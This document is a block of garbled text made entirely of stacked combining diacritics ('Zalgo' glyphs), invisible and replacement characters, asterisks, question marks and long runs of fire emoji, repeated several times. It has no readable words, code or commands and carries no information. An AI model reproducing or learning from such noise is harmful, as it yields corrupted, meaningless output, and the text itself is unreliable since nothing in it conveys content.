̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯́͋͐͊͌̒̕͜͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘̓̈̇͜